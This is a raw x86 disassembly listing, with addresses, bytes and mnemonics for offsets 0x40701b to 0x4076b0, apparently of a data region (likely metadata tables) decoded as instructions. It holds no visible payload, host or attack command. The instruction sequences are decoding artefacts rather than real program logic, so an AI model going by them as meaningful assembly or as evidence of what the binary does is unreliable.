  40701b:	00 89 02 0a 0d 4b    	add    %cl,0x4b0d0a02(%ecx)
  407021:	02 89 02 71 0a 4b    	add    0x4b0a7102(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	b7 1b                	mov    $0x1b,%bh
  40702c:	3e 01 59 01          	add    %ebx,%ds:0x1(%ecx)
  407030:	61                   	popa
  407031:	1d c3 00 a1 02       	sbb    $0x2a100c3,%eax
  407036:	7a 1b                	jp     0x407053
  407038:	c7 00 f9 02 17 15    	movl   $0x151702f9,(%eax)
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 0d 0b 23 02 01    	add    0x102230b,%cl
  407047:	03 17                	add    (%edi),%edx
  407049:	15 0e 00 01 03       	adc    $0x301000e,%eax
  40704e:	47                   	inc    %edi
  40704f:	07                   	pop    %es
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 ab 14 47 02 c1    	add    %ebp,-0x3efdb8ec(%ebx)
  407059:	01 d5                	add    %edx,%ebp
  40705b:	17                   	pop    %ss
  40705c:	42                   	inc    %edx
  40705d:	02 09                	add    (%ecx),%cl
  40705f:	03 17                	add    (%edi),%edx
  407061:	15 6b 01 09 03       	adc    $0x309016b,%eax
  407066:	70 19                	jo     0x407081
  407068:	6a 05                	push   $0x5
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	ff 14 70             	call   *(%eax,%esi,2)
  40706f:	05 19 03 00 1b       	add    $0x1b000319,%eax
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	d6                   	salc
  407079:	0f 7c                	(bad)
  40707b:	05 c1 01 1c 1a       	add    $0x1a1c01c1,%eax
  407080:	47                   	inc    %edi
  407081:	02 19                	add    (%ecx),%bl
  407083:	03 ec                	add    %esp,%ebp
  407085:	1b bf 01 81 02 c8    	sbb    -0x37fd7eff(%edi),%edi
  40708b:	05 86 05 29 03       	add    $0x3290586,%eax
  407090:	6e                   	outsb  %ds:(%esi),(%dx)
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	61                   	popa
  407097:	1b 7b 00             	sbb    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 75 07             	add    %esi,0x7(%ebp)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	37                   	aaa
  4070a3:	07                   	pop    %es
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	05 11 93 05 c1       	add    $0xc1059311,%eax
  4070ad:	01 d3                	add    %edx,%ebx
  4070af:	18 99 05 49 03 17    	sbb    %bl,0x17034905(%ecx)
  4070b5:	15 0e 00 61 01       	adc    $0x161000e,%eax
  4070ba:	52                   	push   %edx
  4070bb:	02 cd                	add    %ch,%cl
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	1e                   	push   %ds
  4070c1:	0d 75 01 69 00       	or     $0x690175,%eax
  4070c6:	17                   	pop    %ss
  4070c7:	15 0e 00 21 02       	adc    $0x221000e,%eax
  4070cc:	6b 0c 70 01          	imul   $0x1,(%eax,%esi,2),%ecx
  4070d0:	69 00 c9 04 aa 05    	imul   $0x5aa04c9,(%eax),%eax
  4070d6:	c1 01 cf             	roll   $0xcf,(%ecx)
  4070d9:	0c b0                	or     $0xb0,%al
  4070db:	05 c1 01 59 14       	add    $0x145901c1,%eax
  4070e0:	47                   	inc    %edi
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 e2                	add    %esp,%edx
  4070e5:	04 bd                	add    $0xbd,%al
  4070e7:	05 59 01 df 0f       	add    $0xfdf0159,%eax
  4070ec:	1d 00 61 03 6b       	sbb    $0x6b036100,%eax
  4070f1:	0c 47                	or     $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	4d                   	dec    %ebp
  4070f7:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  4070fc:	b0 07                	mov    $0x7,%al
  4070fe:	c3                   	ret
  4070ff:	05 59 03 c2 07       	add    $0x7c20359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 6b 0c       	add    $0xc6b0359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	0c 1b                	or     $0x1b,%al
  407110:	c9                   	leave
  407111:	05 79 03 17 15       	add    $0x15170379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 71 06       	add    $0x6710379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 5e 08       	add    $0x85e00c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 5e 08             	add    %bl,0x8(%esi)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 17                	add    (%edi),%edx
  40712d:	15 36 02 0c 00       	adc    $0xc0236,%eax
  407132:	17                   	pop    %ss
  407133:	15 0e 00 0c 00       	adc    $0xc000e,%eax
  407138:	22 03                	and    (%ebx),%al
  40713a:	f5                   	cmc
  40713b:	05 0c 00 57 1b       	add    $0x1b57000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	88 1c fb             	mov    %bl,(%ebx,%edi,8)
  407147:	05 c1 01 e4 10       	add    $0x10e401c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 04 18             	add    %al,(%eax,%ebx,1)
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 f4                	add    %dh,%ah
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 6b 03             	add    %ch,0x3(%ebx)
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	81 1d 1d 06 69 00 17 	sbbl   $0x3011517,0x69061d
  407169:	15 01 03 
  40716c:	61                   	popa
  40716d:	00 17                	add    %dl,(%edi)
  40716f:	15 2d 06 91 03       	adc    $0x391062d,%eax
  407174:	5e                   	pop    %esi
  407175:	08 0e                	or     %cl,(%esi)
  407177:	00 99 03 17 15 56    	add    %bl,0x56151703(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 ba 0b 35 06 81    	add    -0x7ef9caf5(%edx),%edi
  407185:	02 17                	add    (%edi),%dl
  407187:	05 0a 00 91 02       	add    $0x291000a,%eax
  40718c:	b7 1c                	mov    $0x1c,%bh
  40718e:	35 05 91 02 b8       	xor    $0xb8029105,%eax
  407193:	0a 43 06             	or     0x6(%ebx),%al
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	79 05                	jns    0x40719f
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 b7 1c 54    	add    0x541cb702(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 af 0a 7c 05 91    	add    -0x6efa83f6(%edi),%ch
  4071a9:	02 98 0a 6b 01 91    	add    -0x6efe94f6(%eax),%bl
  4071af:	02 d1                	add    %cl,%dl
  4071b1:	1c 5e                	sbb    $0x5e,%al
  4071b3:	06                   	push   %es
  4071b4:	91                   	xchg   %eax,%ecx
  4071b5:	02 68 05             	add    0x5(%eax),%ch
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 22                	add    %ah,(%edx)
  4071bd:	03 f5                	add    %ebp,%esi
  4071bf:	05 b9 03 c0 1b       	add    $0x1bc003b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	ff 14 92             	call   *(%edx,%edx,4)
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	00 1b                	add    %bl,(%ebx)
  4071d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071d1:	06                   	push   %es
  4071d2:	1c 00                	sbb    $0x0,%al
  4071d4:	e3 0a                	jecxz  0x4071e0
  4071d6:	a9 06 24 00 ec       	test   $0xec002406,%eax
  4071db:	1b bf 01 c9 03 c1    	sbb    -0x3efc36ff(%edi),%edi
  4071e1:	10 b3 06 c9 03 18    	adc    %dh,0x1803c906(%ebx)
  4071e7:	03 b9 06 d1 03 25    	add    0x2503d106(%ecx),%edi
  4071ed:	08 c1                	or     %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	ea 04 c8 06 d9 03 08 	ljmp   $0x803,$0xd906c804
  4071f9:	06                   	push   %es
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 b3 08 d8 06 01    	add    0x106d808(%ebx),%esi
  407203:	04 e7                	add    $0xe7,%al
  407205:	12 e2                	adc    %dl,%ah
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	b3 08                	mov    $0x8,%bl
  40720c:	17                   	pop    %ss
  40720d:	07                   	pop    %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	83 19 23             	sbbl   $0x23,(%ecx)
  407213:	07                   	pop    %es
  407214:	34 00                	xor    $0x0,%al
  407216:	95                   	xchg   %eax,%ebp
  407217:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  40721c:	17                   	pop    %ss
  40721d:	15 0e 00 c1 01       	adc    $0x1c1000e,%eax
  407222:	bf 1d 84 00 21       	mov    $0x2100841d,%edi
  407227:	04 17                	add    $0x17,%al
  407229:	15 6b 01 19 04       	adc    $0x419016b,%eax
  40722e:	17                   	pop    %ss
  40722f:	15 59 07 29 04       	adc    $0x4290759,%eax
  407234:	cb                   	lret
  407235:	16                   	push   %ss
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 36                	add    %esi,(%esi)
  40723b:	0c 93                	or     $0x93,%al
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	17                   	pop    %ss
  407241:	15 6b 01 59 02       	adc    $0x259016b,%eax
  407246:	17                   	pop    %ss
  407247:	15 0e 00 31 04       	adc    $0x431000e,%eax
  40724c:	17                   	pop    %ss
  40724d:	15 0e 00 51 04       	adc    $0x451000e,%eax
  407252:	62 0b                	bound  %ecx,(%ebx)
  407254:	01 03                	add    %eax,(%ebx)
  407256:	51                   	push   %ecx
  407257:	04 ff                	add    $0xff,%al
  407259:	0a 01                	or     (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	f9                   	stc
  40725f:	04 7a                	add    $0x7a,%al
  407261:	07                   	pop    %es
  407262:	51                   	push   %ecx
  407263:	04 ae                	add    $0xae,%al
  407265:	0b 81 07 51 04 af    	or     -0x50fbaef9(%ecx),%eax
  40726b:	1c 2b                	sbb    $0x2b,%al
  40726d:	02 51 04             	add    0x4(%ecx),%dl
  407270:	8c 02                	mov    %es,(%edx)
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	3c 15                	cmp    $0x15,%al
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 17             	cmp    %eax,(%edi,%edx,1)
  40727d:	15 8e 07 51 04       	adc    $0x451078e,%eax
  407282:	7e 02                	jle    0x407286
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 51             	cmp    %eax,(%ecx,%edx,2)
  407289:	0e                   	push   %cs
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	17                   	pop    %ss
  40728f:	15 2b 02 59 02       	adc    $0x259022b,%eax
  407294:	88 1c 31             	mov    %bl,(%ecx,%esi,1)
  407297:	02 51 03             	add    0x3(%ecx),%dl
  40729a:	1e                   	push   %ds
  40729b:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a0:	17                   	pop    %ss
  4072a1:	15 6b 01 51 04       	adc    $0x451016b,%eax
  4072a6:	85 02                	test   %eax,(%edx)
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 2c                	add    $0x2c,%al
  4072ad:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072b2:	82 0d 23 02 81 04 42 	orb    $0x42,0x4810223
  4072b9:	1d be 07 91 04       	sbb    $0x49107be,%eax
  4072be:	6b 1c d0 07          	imul   $0x7,(%eax,%edx,8),%ebx
  4072c2:	a1 04 17 15 0e       	mov    0xe151704,%eax
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 df                	add    %ebx,%edi
  4072cb:	18 f9                	sbb    %bh,%cl
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 cb                	add    %bl,%cl
  4072d1:	16                   	push   %ss
  4072d2:	99                   	cltd
  4072d3:	01 49 02             	add    %ecx,0x2(%ecx)
  4072d6:	cb                   	lret
  4072d7:	16                   	push   %ss
  4072d8:	ab                   	stos   %eax,%es:(%edi)
  4072d9:	01 a9 00 17 15 0e    	add    %ebp,0xe151700(%ecx)
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	d6                   	salc
  4072e3:	0f 06                	clts
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	57                   	push   %edi
  4072e9:	1b f4                	sbb    %esp,%esi
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	dc 12                	fcoml  (%edx)
  4072f0:	0e                   	push   %cs
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 88 17 42 02 c1    	add    %ecx,-0x3efdbde9(%eax)
  4072f9:	00 8e 0a 28 08 49    	add    %cl,0x4908280a(%esi)
  4072ff:	02 cb                	add    %bl,%cl
  407301:	16                   	push   %ss
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	ad                   	lods   %ds:(%esi),%eax
  407307:	00 32                	add    %dh,(%edx)
  407309:	08 c1                	or     %al,%cl
  40730b:	01 40 10             	add    %eax,0x10(%eax)
  40730e:	47                   	inc    %edi
  40730f:	02 a9 04 6c 08 37    	add    0x37086c04(%ecx),%ch
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	ad                   	lods   %ds:(%esi),%eax
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  407323:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407329:	01 ce                	add    %ecx,%esi
  40732b:	00 4d 08             	add    %cl,0x8(%ebp)
  40732e:	41                   	inc    %ecx
  40732f:	03 6c 08 52          	add    0x52(%eax,%ecx,1),%ebp
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	ce                   	into
  407337:	00 57 08             	add    %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 ce                	add    %ecx,%esi
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 ce                	add    %ecx,%esi
  407343:	00 61 08             	add    %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 b4 05 68 08 b1 04 	add    %esi,0x4b10868(%ebp,%eax,1)
  40734e:	6c                   	insb   (%dx),%es:(%edi)
  40734f:	08 6d 08             	or     %ch,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 cb                	add    %bl,%cl
  407355:	16                   	push   %ss
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 58 1d             	add    0x1d(%eax),%ebx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	17                   	pop    %ss
  407361:	15 88 08 c1 00       	adc    $0xc10888,%eax
  407366:	85 0a                	test   %ecx,(%edx)
  407368:	f4                   	hlt
  407369:	01 89 01 17 15 6b    	add    %ecx,0x6b151701(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	e0 00                	loopne 0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 31                	add    (%ecx),%dh
  407379:	06                   	push   %es
  40737a:	bd 08 49 02 b4       	mov    $0xb4024908,%ebp
  40737f:	05 c4 08 49 02       	add    $0x24908c4,%eax
  407384:	65 00 cb             	gs add %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	ad                   	lods   %ds:(%esi),%eax
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	e9 00 d9 08 49       	jmp    0x49494c95
  407395:	02 ce                	add    %dh,%cl
  407397:	00 e0                	add    %ah,%al
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	cb                   	lret
  40739d:	16                   	push   %ss
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 17             	roll   $1,(%edi,%edx,1)
  4073a3:	15 28 09 09 00       	adc    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 76 1a             	add    %dh,0x1a(%esi)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 5a 1a             	add    %bl,0x1a(%edx)
  4075c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 b3 13 a9 00 00    	add    %dh,0xa913(%ebx)
  4075cd:	00 2e                	add    %ch,(%esi)
  4075cf:	0b ae 00 00 00 f0    	or     -0x10000000(%esi),%ebp
  4075d5:	19 ae 00 00 00 d9    	sbb    %ebp,-0x27000000(%esi)
  4075db:	0a b2 00 00 00 56    	or     0x56000000(%edx),%dh
  4075e1:	03 b7 00 00 00 f6    	add    -0xa000000(%edi),%esi
  4075e7:	02 bb 00 00 00 98    	add    -0x68000000(%ebx),%bh
  4075ed:	0b b2 00 00 00 02    	or     0x2000000(%edx),%esi
  4075f3:	0f bf 00             	movswl (%eax),%eax
  4075f6:	00 00                	add    %al,(%eax)
  4075f8:	fd                   	std
  4075f9:	0c b7                	or     $0xb7,%al
  4075fb:	00 00                	add    %al,(%eax)
  4075fd:	00 ba 1a c3 01 00    	add    %bh,0x1c31a(%edx)
  407603:	00 da                	add    %bl,%dl
  407605:	0f f8 01             	psubb  (%ecx),%mm0
  407608:	00 00                	add    %al,(%eax)
  40760a:	9d                   	popf
  40760b:	0d fe 01 00 00       	or     $0x1fe,%eax
  407610:	ab                   	stos   %eax,%es:(%edi)
  407611:	0c 69                	or     $0x69,%al
  407613:	02 00                	add    (%eax),%al
  407615:	00 f3                	add    %dh,%bl
  407617:	13 6d 02             	adc    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	1e                   	push   %ds
  40761d:	19 71 02             	sbb    %esi,0x2(%ecx)
  407620:	00 00                	add    %al,(%eax)
  407622:	9f                   	lahf
  407623:	1c 75                	sbb    $0x75,%al
  407625:	02 00                	add    (%eax),%al
  407627:	00 f8                	add    %bh,%al
  407629:	07                   	pop    %es
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
